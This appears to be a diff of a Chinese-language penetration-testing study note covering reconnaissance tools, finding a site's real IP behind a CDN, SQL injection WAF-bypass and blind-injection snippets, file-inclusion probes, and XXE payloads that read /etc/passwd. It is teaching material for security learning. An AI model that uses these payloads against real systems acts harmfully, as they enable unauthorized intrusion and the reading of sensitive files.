@@ -2,41 +2,42 @@
 
 渗透测试和渗透攻击的第一步是收集目标信息，俗称踩点。信息收集得越全面，就越容易找到防御薄弱点。最重要的信息是**域名与IP地址**、**端口与服务**
 
-例如，假设搜集一家名叫Polygon的企业（所有信息均为虚构，与现实中的企业、网站无关）的网络资产，搜集过程如下：
+例如，假设搜集一家企业的网络资产，搜集过程如下：
 
 ```mermaid
 graph LR
     begin([开始收集])
 
     %% 域名、IP
-    begin -->|收集域名、IP地址| d1(service.polygon.com) & d2("
-        passport.polygon.com
-        mail.polygon.com
-        fuwu.polygon-cn.com
+    begin -->|收集域名、IP地址| d1(service.example.com) & d2("
+        passport.example.com
+        mail.example.com
+        fuwu.example-cn.com
         183.2.172.17
         ……
     ")
 
     %% 端口、服务
-    d1 -->|探测端口| ssh(22) & http(443)
+    d1 -->|探测端口| ssh(22) & http(80)
     ssh -->|识别服务| ssh_detail(OpenSSH 9.9)
     http -->|识别服务| http_detail("
-        Apache 2.4.52
-        PHP 8.1.2
-        MySQL 8.0
-        WordPress 6.8.1
-        ……
+        用户管理系统。路径:/index
+        组件：PHP 8.1.2, MySQL 8.0, WordPress, ...
+    ")
+    http -->|识别服务| http_detail2("
+        Nacos
+        路径：/nacos
     ")
     d2 -..->|探测端口、识别服务| d2service(……)
 
     %% 梳理资产
     fin([梳理资产])
-    ssh_detail & http_detail & d2service --> fin
+    ssh_detail & http_detail & http_detail2 & d2service --> fin
 ```
 
-这个例子中，首先找到`service.polygon.com`、`passport.polygon.com`等属于该公司的域名、IP地址。每个域名和IP地址对应该公司的一台主机，或者多台主机，又或是该公司租用的云服务器
+这个例子中，首先找到`service.example.com`、`passport.example.com`等属于该公司的域名、IP地址。每个域名和IP地址对应该公司的一台主机，或者多台主机，又或是该公司租用的云服务器
 
-然后，探测每个地址提供的服务。在`service.polygon.com`，发现22端口开放，提供SSH服务；443端口开放，提供HTTP服务，并识别到它使用的服务器、开发语言、后端数据库、CMS等信息；其他各地址也同理探测
+然后，探测每个地址提供的服务。在`service.example.com`，发现22端口开放，提供SSH服务；443端口开放，提供HTTP服务，并识别到它使用的服务器、开发语言、后端数据库、CMS等信息（注意，一个端口可能提供多个服务，Web端口尤其常见，可能需要路径扫描）；其他各地址也同理探测
 
 最后，梳理资产，剔除不属于目标的资产，并筛选出高价值资产。至此，信息收集暂告一段落。信息搜集的作用有两方面
 
@@ -63,14 +64,14 @@ graph LR
 ### 工具
 
 - **域名**
-  - **Whois查询**：[爱站网](https://whois.aizhan.com/)、[站长之家](https://whois.chinaz.com/)
-  - **ICP备案查询**：[工信部备ICP案管理系统](https://beian.miit.gov.cn/)、天眼查、[小蓝本](https://sou.xiaolanben.com/)
-  - **子域名爆破**：[OneForAll](https://github.com/shmilylty/OneForAll)
-- **综合工具**
-  - **网络空间测绘工具**：可以搜索目标的子域名、ICP备案、开放端口、指纹等网络资产信息
-    - 国内：[鹰图](https://hunter.qianxin.com/)、[FOFA](https://fofa.info/)、[钟馗之眼](https://www.zoomeye.org/)、[Quake](https://quake.360.net/quake/#/index)、[微步](https://x.threatbook.cn)、[零零信安](https://0.zone/)
-    - 国外：[Shodan](https://www.shodan.io/)（[语法参考](https://help.shodan.io/the-basics/search-query-fundamentals)）、[VirusTotal](https://www.virustotal.com/gui/home/upload)
-  - **搜索引擎**：搜索引擎可以检索目标网站公开的页面，其中除了常规页面外，还有机会找到配置文件、后台登录页面等。也有机会找到各种社会学信息，如员工的邮箱、子公司等。常用关键字：`site:域名 intitle:标题 intext:网页内容 filetype:文件后缀 inurl:链接`；更多用法可参考[Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
+  - Whois查询：[爱站网](https://whois.aizhan.com/)、[站长之家](https://whois.chinaz.com/)
+  - ICP备案查询：[工信部备ICP案管理系统](https://beian.miit.gov.cn/)、天眼查、[小蓝本](https://sou.xiaolanben.com/)
+  - 子域名爆破
+- **网络空间测绘工具**：可以搜索目标的子域名、ICP备案、开放端口、指纹等网络资产信息
+  - 国内：[鹰图](https://hunter.qianxin.com/)、[FOFA](https://fofa.info/)、[钟馗之眼](https://www.zoomeye.org/)、[Quake](https://quake.360.net/quake/#/index)、[微步](https://x.threatbook.cn)、[零零信安](https://0.zone/)
+  - 国外：[Shodan](https://www.shodan.io/)（[语法参考](https://help.shodan.io/the-basics/search-query-fundamentals)）、[VirusTotal](https://www.virustotal.com/gui/home/upload)
+- **搜索引擎**：搜索引擎可以检索目标网站公开的页面，其中除了常规页面外，还有机会找到配置文件、后台登录页面等。也有机会找到各种社会学信息，如员工的邮箱、子公司等。常用关键字：`site:域名 intitle:标题 intext:网页内容 filetype:文件后缀 inurl:链接`；更多用法可参考[Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
+- **综合搜索工具**：[ARL](https://github.com/Aabyss-Team/ARL)、[OneForAll](https://github.com/shmilylty/OneForAll)
 - **其他**
   - **前端代码分析**：`JSFinder`脚本、`FindSomething`插件分析网页HTML、JavaScript源代码寻找信息
 
@@ -84,19 +85,19 @@ graph LR
 - **DNS历史记录**：如[ip138](https://site.ip138.com/)，找启用CDN之前的ip
 - **DDoS攻击**：打光网站CDN流量
 
-找到疑似真实IP后，首先可以多方法互相验证；然后可以尝试改Hosts，能正常访问就说明找到真实IP地址了
+找到疑似真实IP后，首先可以多方法互相验证；然后可以尝试进行Host碰撞，能正常访问就说明找到真实IP地址了
 
 ## 端口、服务
 
 找到真实IP地址后，就可以探测哪些端口开放、各端口运行什么服务
 
 1. 测绘工具
-2. 扫描工具：nmap，masscan，goby，tscan，fscan等
+2. 端口扫描工具：nmap，masscan，goby，tscan，fscan等
+3. 路径扫描工具：dirsearch等
 
-访问各端口，通过服务器返回数据的特征识别服务器使用了哪些应用程序（服务器软件、中间件、CMS等），例如服务器返回Apache的默认404页面就可以推断服务器使用Apache；部分资源路径包含`wp-content`，可以推断服务器使用Word Press。这种方法叫做**指纹识别**
+访问各端口，通过服务器返回数据的特征识别服务器使用了哪些应用程序（服务器软件、中间件、CMS等），例如服务器返回Apache的默认404页面就可以推断服务器使用Apache；部分资源路径包含`wp-content`，可以推断服务器使用Word Press。这种方法叫做**指纹识别**。常用指纹识别工具有
 
-- **手工识别**：内容太多，且实用性较差，从略
-- **指纹识别工具**：nmap的服务识别就是一种指纹识别；其他工具还有wappalyzer（浏览器插件），御剑，[webanalyzer](https://github.com/webanalyzer/rules)，[whatweb](https://whatweb.net/)，tidefinger，ehole等
+- wappalyzer（浏览器插件），御剑，[webanalyzer](https://github.com/webanalyzer/rules)，[whatweb](https://whatweb.net/)，tidefinger，ehole等
 
 ## 辅助信息
 
@@ -387,30 +388,28 @@ XML外部实体（XML eXternal Entity）可以引用外部数据，例如文件�
 
 WAF等防护系统会采用特征识别危险请求。防护系统不能影响正常业务，识别的关键字肯定是有限的
 
+**一般语句**
+
 ```sql
 -- 过滤空格：用行内注释、括号、浮点数、反引号括起表名列名等代替
 SELECT name FROM users WHERE id=1e0union(select`pw`from`users`where(id=1));
 
--- 过滤引号：使用编码(ord, ascii, char, hex, unhex等)或者十六进制数
-SELECT * FROM users WHERE id=0 or name=0x61646d696e;     -- 'admin' = 0x6169...
-SELECT * FROM users WHERE id=0 or name like char(24869); -- 'a%' = 24869，注意int超出32位会截断
+-- 过滤引号：字符串编码(ord, ascii, char, hex, unhex等)或者十六进制数
+SELECT name=0x61646d696e;     -- 'admin' = 0x6169...
+SELECT name like char(24869); -- 'a%' = 24869，注意超出int32会截断
 
 -- 过滤运算符：函数式编程。下面例子判断database()第一个字符码值是否大于64
 SELECT * FROM users WHERE id=-1||least(substr(database(),1,1),'a')like'a';
-
--- 过滤注释：闭合引号、括号
-SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
 
 -- 过滤逗号：Join查询；部分函数内逗号可用关键字代替
 SELECT id, name FROM users WHERE id="0"union select * from ((select 1)A join (select 2)B);
 SELECT substr('abc' from 1 for 1), trim(leading 'a' from 'abc');
 ```
 
-### 注入方式
-
-#### 盲注
+**布尔盲注**：从子句或者变量中提取出1比特的信息
 
 ```mysql
+-- 字符串截取
 SELECT substr('a', 1, 1);
 -- 同义函数：substring, mid, left, right
 -- 类似效果：regexp, rlike, trim, insert, like
@@ -419,9 +418,15 @@ SELECT substr('a', 1, 1);
 SELECT 1 between 1 and 1;
 SELECT 'a' in ('a');
 SELECT ascii('a')-97;
+
+-- 分支
+SELECT if(1=1, 'hello', 'bye'); -- 类似三目运算符
+SELECT nullif('a', 'b');        -- 若两个参数相同则返回其值，否则返回NULL。同名函数：ifnull
+SELECT decode(1, 1, 'a', 'b');  -- 若第一个参数和第二个参数相等，返回a，否则返回b。oracle原生
+SELECT coalesce(NULL, 1);       -- 返回第一个非NULL值
 ```
 
-#### 延时
+**延时盲注**
 
 ```sql
 SELECT sleep(1);
@@ -430,7 +435,7 @@ SELECT count(*) from tableA, tableB;  # 利用笛卡尔积
 select * from wp_user_ where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) # 利用复杂正则
 ```
 
-#### 报错
+**报错注入**
 
 参考：https://www.cnblogs.com/feizianquan/p/10794681.html
 
@@ -619,64 +624,38 @@ window[8680439..toString(30)][1]
 [1].find(alert)
 ```
 
-## 反序列化
+## 文件包含
 
-### PHP
+可以首先用已知文件、常见文件探测是否存在文件包含：
 
-#### 简介
-
-PHP的`serialize`函数将对象转换为字符串，其中包括了对象的类名、属性名和属性值；`unserialize`函数将字符串转换回对象
-
-```php
-class Connection {
-    # 属性
-    protected $db;
-    private $user, $pass;
-    # 方法
-    private function connect(){
-        $this->db = new PDO('mysql:host=localhost;dbname=test', $this->user, $this->pass);
-    }
-    # 魔术方法
-    public function __construct($user, $pass){
-        $this->user = $user;
-        $this->pass = $pass;
-    }
-    public function __sleep(){
-        return array('user', 'pass');
-    }
-    public function __wakeup(){
-        // this->connect();
-        echo "wakeup\n";
-    }
-    public function __destruct(){
-        $this->db = null;
-    }
-}
-
-$conn = new Connection("John Doe", "p@ssword");
-echo serialize($conn);
-'O:10:"Connection":2:{s:16:"Connectionuser";s:8:"John Doe";s:16:"Connectionpass";s:8:"p@ssword";}'
+```
+/etc/passwd
+C:\boot.ini
+C:\WINDOWS\win.ini
 ```
 
-序列化字符串中，
 
-- `O`：表示这是一个对象（数组则是A）
-- `10:"Connection"`：类名长度为10，值为`Connection`
-- `2`：有2个属性
-- `s:16:"Connectionuser"`：第一个属性名，它是字符串（`s`），长度为16，名为`Connectionuser`（private属性名会加上一些别的东西，8.2版本是类名，其他版本也有加空字节的）
-- `s:8:"John Doe"`：第一个属性值。含义同上
 
-`__wakeup`，`__destruct`都是与反序列化漏洞强相关的魔术方法，反序列化必定调用它们；其他魔术方法也可能被调用。假如`__wakeup`中有危险代码，或服务器用反序列化得到的对象进行危险操作，控制序列化字符串就能进行攻击了。不过，开发者不太可能犯这么大的错，一般需要用后面几节的技术
+## XXE
 
-注意：序列化字符串中可能有空字节，注意检查
+```xml
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
 
-#### POP链
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
 
-面向属性编程链（Property-Oriented Programming Chain，也叫Gadget Chain）
-
-#### phar文件
-
-phar文件是PHP代码和资源的压缩包，其中以序列化形式存储了phar元数据。PHP以`phar://`封装协议访问phar文件时会反序列元数据。结合文件上传漏洞 + 可以控制文件名的文件操作（例如`example.com/download?file=phar://phar.gif`）就能利用反序列化攻击
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+```
 
 # 后渗透
 
